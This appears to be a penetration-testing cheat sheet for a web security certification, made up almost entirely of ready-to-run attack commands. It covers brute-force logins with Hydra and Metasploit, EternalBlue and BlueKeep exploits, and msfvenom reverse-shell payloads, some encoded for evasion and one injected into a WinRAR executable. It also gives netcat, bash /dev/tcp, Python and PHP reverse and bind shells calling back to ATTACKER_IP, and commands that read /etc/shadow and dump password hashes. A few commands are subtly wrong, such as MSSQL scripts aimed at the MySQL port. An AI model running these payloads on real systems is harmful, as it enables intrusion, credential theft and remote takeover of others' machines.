# 📔 eWPTX Cheat Sheet

## [Te**sting Checklist and Template**](https://github.com/OWASP/wstg/tree/master/checklists)

[OWASP - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)

* [OWASP Testing Checklist (Excel)](https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.xlsx)
* [OWASP Testing Checklist (Markdown)](https://raw.githubusercontent.com/OWASP/wstg/master/checklists/checklist.md)
* [Google Spreadsheet template](https://docs.google.com/spreadsheets/d/1csiYqA3DXhpz69K2JCLKN4H-kzkRFlFi/copy?copyCollaborators=false\&copyComments=false\&title=WSTG+Checklist)

Other CheatSheets:

* [CheatSheet OWASP](https://cheatsheetseries.owasp.org/)
* [PayloadsAllThingsWeb](https://swisskyrepo.github.io/PayloadsAllTheThings/)

## **Tools**

```bash
# Gobuster - Install
sudo apt update && sudo apt install -y gobuster

# Dirbuster - Install
sudo apt update && sudo apt install -y dirb

# Nikto - Install
sudo apt update && sudo apt install -y nikto

# BurpSuite - Install
sudo apt update && sudo apt install -y burpsuite

# SQLMap - Install
sudo apt update && sudo apt install -y sqlmap

# XSSer - Install
sudo apt update && sudo apt install -y xsser

# WPScan - Install
sudo apt update && sudo apt install -y wpscan

# Hydra - Install
sudo apt update && sudo apt install -y hydra
```

* [Burp Suite Configuration](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/portswigger-web-security-academy/information-disclosure)
* [Testing Tools Resource](https://owasp.org/www-project-web-security-testing-guide/stable/6-Appendix/A-Testing_Tools_Resource)
* More tools info [here](https://app.gitbook.com/o/s2H3MdEB0Qp2IbE58Gxw/s/iS3hadq7jVFgSa8k5wRA/)

{% hint style="warning" %}
In the exam browser extensions shouldn't works, so it's necessary set proxy manually
{% endhint %}

## Networking

#### **Routing**

```bash
# Linux
ip route

# Windows
route print

# Mac OS X / Linux
netstat -r
```

#### **IP**

```bash
# Linux
ip a
ip -br -c a

# Windows
ipconfig /all

# Mac OS X / Linux
ifconfig
```

#### **ARP**

```bash
# Linux
ip neighbour

# Windows
arp -a

# Mac OS X / Linux
arp
```

#### **Ports**

```bash
# Linux
netstat -tunp
netstat -tulpn
ss -tnl

# Windows
netstat -ano

# Mac OS X / Linux
netstat -p tcp -p udp
lsof -n -i4TCP -i4UDP
```

#### **Connect and Scan**

```bash
nc -v example.com 80

openssl s_client -connect <HOST>:<PORT>
openssl s_client -connect <HOST>:<PORT> -debug
openssl s_client -connect <HOST>:<PORT> -state
openssl s_client -connect <HOST>:<PORT> -quiet

# Scan port
nc -zv <HOST> <PORT>
```

## Information Gathering

```bash
host <HOST>
whatweb <HOST>
whois <HOST>
whois <IP>

dnsrecon -d <HOST>

wafw00f -l
wafw00f <HOST> -a

sublist3r -d <HOST>
theHarvester -d <HOST>
theHarvester -d <HOST> -b all
```

#### **Google Dorks**

```url
site:
inurl:
site:*.sitename.com
intitle:
filetype:
intitle:index of
cache:
inurl:auth_user_file.txt
inurl:passwd.txt
inurl:wp-config.bak
```

#### **DNS**

```bash
sudo nano /etc/hosts
dnsenum <HOST>
# e.g. dnsenum zonetransfer.me

dig <HOST>
dig axfr @DNS-server-name <HOST>

fierce --domain <HOST>
```

### **Host Discovery**

```bash
## Ping scan
sudo nmap -sn <TARGET_IP/NETWORK>
## ARP scan
netdiscover -i eth1 -r <TARGET_IP/NETWORK>

# NMAP PORT SCAN
nmap <TARGET_IP>
## Skip ping
nmap -Pn <TARGET_IP>
## Host discovery + saving into file
nmap -sn <TARGET_IP>/<SUB> > hosts.txt
nmap -sn -T4 <TARGET_IP>/<SUB> -oG - | awk '/Up$/{print $2}'
## Scan all ports
nmap -p- <TARGET_IP>
## Open ports scan + saving into file
nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
## Port 80 only scan
nmap -p 80 <TARGET_IP>
## Custom list of ports scan
nmap -p 80,445,3389,8080 <TARGET_IP>
## Custom ports range scan
nmap -p1-2000 <TARGET_IP>
## Fast mode & verbose scan
nmap -F <TARGET_IP> -v
## UDP scan
nmap -sU <TARGET_IP>
## Service scan
nmap -sV <TARGET_IP>
## Service + O.S. detection scan
sudo nmap -sV -O <TARGET_IP>
## Default Scripts scan
nmap -sC <TARGET_IP>
nmap -Pn -F -sV -O -sC <TARGET_IP>
## Aggressive scan
nmap -Pn -F -A <TARGET_IP>
## Timing (T0=slow ... T5=insanely fast) scan
nmap -Pn -F -T5 -sV -O -sC <TARGET_IP> -v
## Output scan
nmap -Pn -F -oN outputfile.txt <TARGET_IP> 
nmap -Pn -F -oX outputfile.xml <TARGET_IP> 
## Output to all formats
nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
nmap -A -oA outputfile <TARGET_IP>
```

## Footprinting & Scanning

#### **Network Discovery**

```bash
sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
ping <TARGET_IP>
sudo nmap -sn <TARGET_IP/NETWORK>

tracert    google.com     #Windows 
traceroute google.com     #Linux

## fping
fping -I eth1 -g <TARGET_IP/NETWORK> -a
## fping with no "Host Unreachable errors"
fping -I eth1 -g <TARGET_IP/NETWORK> -a fping -I eth1 -g <TARGET_IP/NETWORK> -a 2>/dev/null
```

## Enumeration

### **Nmap**

```bash
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>

nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>

nmap -p 445 --script smb-enum-sessions <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>

nmap -p 445 --script smb-os-discovery <TARGET_IP>

nmap -p445 --script=smb-vuln-* <TARGET_IP>
```

### **Nmblookup**

<pre class="language-bash"><code class="lang-bash"><strong>nmblookup -A &#x3C;TARGET_IP>
</strong></code></pre>

### **RPCClient**

```bash
rpcclient -U "" -N <TARGET_IP>
## RPCCLIENT
enumdomusers
enumdomgroups
lookupnames admin
```

### **Enum4Linux**

```bash
enum4linux -o <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>

## NULL SESSIONS

# 1 - Use “enum4linux -n” to make sure if “<20>” exists:
enum4linux -n <TARGET_IP>
# 2 - If “<20>” exists, it means Null Session could be exploited. Utilize the following command to get more details:
enum4linux <TARGET_IP>
# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
# 4 - You also can connect the remote server by applying the following command:
smbclient \\\\<TARGET_IP>\\c$ -N -U ""
# 5 - Download those files stored on the share drive:
smb: \> get file_shared.txt
```

### **Hydra**

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb
```

We can use a wordlist generator tools (how [Cewl](https://app.gitbook.com/s/iS3hadq7jVFgSa8k5wRA/practical-ethical-hacker-notes/tools/cewl)), to create custom wordlists.

### **Metasploit**

```bash
# METASPLOIT Starting
msfconsole
msfconsole -q

# METASPLOIT SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor

## set options depends on the selected module
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
exploit
```

### **FTP**

#### **Nmap**

```bash
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 -sV -O <TARGET_IP>

nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

#### **Ftp Client**

```bash
ftp <TARGET_IP>
ls
cd /../..
get <filename>
put <filename>
```

**Hydra**

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

### **SSH**

#### **Nmap**

```bash
# NMAP
sudo nmap -p 22 -sV -sC -O <TARGET_IP>

nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>

nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>

nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
```

#### **Netcat**

```bash
# NETCAT
nc <TARGET_IP> <TARGET_PORT>
nc <TARGET_IP> 22
```

#### **SSH**

```bash
ssh <USER>@<TARGET_IP> 22
ssh root@<TARGET_IP> 22
```

#### **Hydra**

```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
```

#### **Metasploit**

```bash
use auxiliary/scanner/ssh/ssh_login

set RHOSTS <TARGET_IP>
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

### **HTTP**

#### **Nmap**

```bash
sudo nmap -p 80 -sV -O <TARGET_IP>

nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
```

#### **Alternative**

```bash
whatweb <TARGET_IP>
http <TARGET_IP>
browsh --startup-url http://<TARGET_IP>

dirb http://<TARGET_IP>
dirb http://<TARGET_IP> /usr/share/metasploit-framework/data/wordlists/directory.txt

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/ #brute http basic auth
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/ #brute http digest
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed" # brute http post form
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v" #brute http authenticated post form

wget <TARGET_IP>
curl <TARGET_IP> | more
curl -I http://<TARGET_IP>/<DIR>
curl --digest -u <USER>:<PW> http://<TARGET_IP>/<DIR>

lynx <TARGET_IP>
```

#### **Metasploit**

```bash
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/http_login
use auxiliary/scanner/http/http_version

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set HTTP_METHOD GET
set TARGETURI /<DIR>/

set USER_FILE <USERS_LIST>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set AUTH_URI /<DIR>/
exploit
```

### **SQL**

#### **Nmap**

```bash
sudo nmap -p 3306 -sV -O <TARGET_IP>

nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-info <TARGET_IP>
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-databases --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-audit --script-args="mysql-audit.username='<USER>',mysql-audit.password='<PW>',mysql-audit.filename=''" <TARGET_IP>

nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

nmap -p 3306 --script=mysql-query --script-args="query='select count(*) from <DB_NAME>.<TABLE_NAME>;',username='<USER>',password='<PW>'" <TARGET_IP>

nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13

## Microsoft SQL
nmap -sV -sC -p 1433 <TARGET_IP>

nmap -p 1433 --script ms-sql-info <TARGET_IP>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>

nmap -p 3306 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt <TARGET_IP>

nmap -p 3306 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt

nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>

nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <TARGET_IP>
```

```bash
# MYSQL
mysql -h <TARGET_IP> -u <USER>
mysql -h <TARGET_IP> -u root

# Mysql client
help
show databases;
use <DB_NAME>;
select count(*) from <TABLE_NAME>;
select load_file("/etc/shadow");
```

#### **Hydra**

```bash
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> mysql
```

#### **Metasploit**

```bash
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login

## MS Sql
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_enum_domain_accounts

# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

## set options depends on the selected module
set USERNAME root
set PASSWORD ""

set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE false
set PASSWORD ""

set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""

set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true

set CMD whoami
exploit
```

#### Vulnerability Assessment

```bash
# HEARTBLEED
nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET>
nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>

# ETERNALBLUE
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# BLUEKEEP
msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# LOG4J
nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_IP>
```

```bash
searchsploit badblue 2.7
```

## Host Based Attacks

### **IIS WEBDAV**

```bash
# IIS WEBDAV
davtest -url <URL>
davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav

cadaver [OPTIONS] <URL>

nmap -p 80 --script http-enum -sV <TARGET_IP>
```

```bash
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f <file_type> > shell.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
```

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <TARGET_IP> http-get /webdav/
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/multi/handler
use exploit/windows/iis/iis_webdav_upload_asp

set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>

set HttpUsername <USER>
set HttpPassword <PW>
set PATH /webdav/metasploit.asp
```

### **RDP**

```bash
# RDP
nmap -sV <TARGET_IP>
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

set RPORT <PORT>

# ! Kernel crash may be caused !
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

show targets
set target <NUMBER>
set GROOMSIZE 50
```

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
```

```bash
xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>

xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing
```

### **WINRM**

```bash
# WINRM
crackmapexec [OPTIONS]
evil-winrm -i <IP> -u <USER> -p <PASSWORD>

nmap --top-ports 7000 <TARGET_IP>
nmap -sV -p 5985 <TARGET_IP>
```

```bash
crackmapexec winrm <TARGET_IP> -u <USER> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"
crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "systeminfo"
```

```bash
# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

```bash
## METASPLOIT
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

use exploit/windows/winrm/winrm_script_exec

set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

**Meterpreter**

```bash
# meterpreter > <command>

background    #Switch from a Meterpreter session to the msfconsole command line 
cat
cd
checksum md5 /bin/bash
clearev
download Filename /root/****   #Download From victm machine to your machine 
edit
execute -f ifconfig
getenv
getenv PATH
getuid
hashdump
idletime
ifconfig
lpwd
ls
migrate
mkdir
ps
pwd
resource <file.txt>
rmdir
search -f *.txt
shell   #run a standard operating system shell 
sysinfo   #information about the victm Machine 
upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
```

## **Payloads**

#### **MSFVenom shells**

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders

# Win 32bit
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x86>.exe

# Win 64bit
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > <PAYLOAD_FILE_x64>.exe

# Linux 32bit
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x86>

# Linux 64bit
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f elf > <PAYLOAD_FILE_x64>

# Win 32bit + shikata_ga_nai encoded
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Use more encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f exe > <PAYLOAD_ENCODED_x86>.exe

# Linux 32bit + shikata_ga_nai encoded
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -i 10 -e x86/shikata_ga_nai -f elf > <PAYLOAD_ENCODED_x86>

# Inject into Portable Executables
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe

# JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\                   #PHP Web Application
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

#### **MSF Staged and Non Staged Payload**

```bash
# MSF STAGED Payload
windows/x64/meterpreter/reverse_tcp

# MSF NON-STAGED Payload
windows/x64/meterpreter_reverse_https
```

```bash
# Upload the payload on the target and try it with MSFconsole
cd Payloads
sudo python -m http.server 8080
msfconsole -q

use multi/handler
set payload <MSFVENOM_PAYLOAD>
set LHOST <MSFVENOM_LOCAL_HOST_IP>
set LPORT <MSFVENOM_LOCAL_PORT>
run
```

```bash
# Automation
ls -lah /usr/share/metasploit-framework/scripts/resource

# Create a handler resource
nano handler.rc
# Insert the following lines
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT>
run
# Save it and exit

msfconsole -q -r handler.rc

# msfconsole
resource handler.rc

# Export inserted msfconsole commands into a resource script
makerc <FILE>.rc
```

#### **Shells**

```bash
# NETCAT - Install
sudo apt update && sudo apt install -y netcat
# or upload the nc.exe on the target machine

nc <TARGET_IP> <TARGET_PORT>
nc -nv <TARGET_IP> <TARGET_PORT>
nc -nvu <TARGET_IP> <TARGET_UDP_PORT>

## NC Listener
nc -nvlp <LOCAL_PORT>
nc -nvlup <LOCAL_UDP_PORT>

## Transfer files
# Target machine
nc.exe -nvlp <PORT> > test.txt
# Attacker machine
echo "Hello target" > test.txt
nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
```

```bash
# BIND SHELL

## Target Win machine - Bind shell listener with executable cmd.exe
nc.exe -nvlp <PORT> -e cmd.exe
## Attacker Linux machine
nc -nv <TARGET_IP> <PORT>

## Target Linux machine - Bind shell listener with /bin/bash
nc -nvlp <PORT> -c /bin/bash
## Attacker Win machine
nc.exe -nv <TARGET_IP> <TARGET_PORT>
```

```bash
# REVERSE SHELL

## Attacker Linux machine
nc -nvlp <PORT>
## Target Win machine
nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe

## Attacker Linux machine
nc -nvlp <PORT>
## Target Linux machine
nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
```

```bash
# Spawn shells
python -c 'import pty; pty.spawn("/bin/sh")'
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
echo os.system('/bin/bash')
/bin/sh -i
bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1'"); ?>
/usr/bin/script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

**IIS/FTP**

```bash
# Targeting IIS/FTP
nmap -sV -sC -p21,80 <TARGET_IP>
## Try anonymous:anonymous
ftp <TARGET_IP>

## Brute-force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I

## Generate an .asp reverse shell payload
cd <TARGET>/
ip -br -c a
msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx

## FTP Login with <USER>
ftp <TARGET_IP>
put shell.aspx

## msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.
```

**OPENSSH**

```bash
# Targeting OPENSSH
nmap -sV -sC -p 22 <TARGET_IP>b

searchsploit OpenSSH 7.1

## Brute-force SSH
hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh

## SSH Login with <USER>
ssh <USER>@<TARGET_IP>

## Win
bash
net localgroup administrators
whoami /priv

# msfconsole
use auxiliary/scanner/ssh/ssh_login
setg RHOST <TARGET_IP>
setg RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
run
session 1
# CTRL+Z to background
sessions -u 1
```

**SMB**

```bash
# Targeting SMB
nmap -sV -sC -p 445 <TARGET_IP>

## Brute-force SMB
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb

## Enumeration
smbclient -L <TARGET_IP> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>

## msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PW>
run

## SMB Login with <USER>
locate psexec.py
cp /usr/share/doc/python3-impacket/examples/psexec.py .
chmod +x psexec.py
python3 psexec.py Administrator@<TARGET_IP>
python3 psexec.py <USER>@<TARGET_IP>

# msfconsole - Meterpreter
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
set payload windows/x64/meterpreter/reverse_tcp
run

# Without <USER>:<PW>, exploit a vulnerability, e.g. EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run
```

**MYSQL**

```bash
# Targeting MYSQL (Wordpress)
nmap -sV -sC -p 3306,8585 <TARGET_IP>

searchsploit MySQL 5.5

## Brute-force MySql - msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

## MYSQL Login with <USER>
mysql -u root -p -h <TARGET_IP>

show databases;
use <db>;
show tables;
select * from <table>;

## msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run

sysinfo
cd /
cd wamp
dir
cd www\\wordpress
cat wp-config.php
shell
```

## Web Application Penetration Testing

### **Enumeration & Scanning**

```bash
nmap -sS -sV -p 80,443,3306 <TARGET_IP>

# CURL
curl -I <TARGET_IP>
curl -X GET <TARGET_IP>
curl -X OPTIONS <TARGET_IP> -v
curl -X POST <TARGET_IP>
curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
curl -X PUT <TARGET_IP>

curl <TARGET_IP>/uploads/ --upload-file hello.txt
curl -X DELETE <TARGET_IP>/uploads/hello.txt -v

# Nikto
nikto -h http://<TARGET_IP> -o niktoscan.txt

nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm

#WPScan
wpscan --url http://<TARGET_IP>--enumerate u
wpscan --url http://<TARGET_IP> -e vp --plugins-detection mixed --api-token API_TOKEN
wpscan --url http://<TARGET_IP> -e u --passwords /usr/share/wordlists/rockyou.txt
wpscan --url http://<TARGET_IP> -U admin -P /usr/share/wordlists/rockyou.txt
```

### **Directory Enumeration**

```bash
# Dirbuster
dirb http://<TARGET_IP>

# Gobuster
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404

gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

# Ffuf
## Directory discovery:
ffuf -w wordlist.txt -u http://example.com/FUZZ
## File discovery:
ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
## Output of responses with status code:
ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
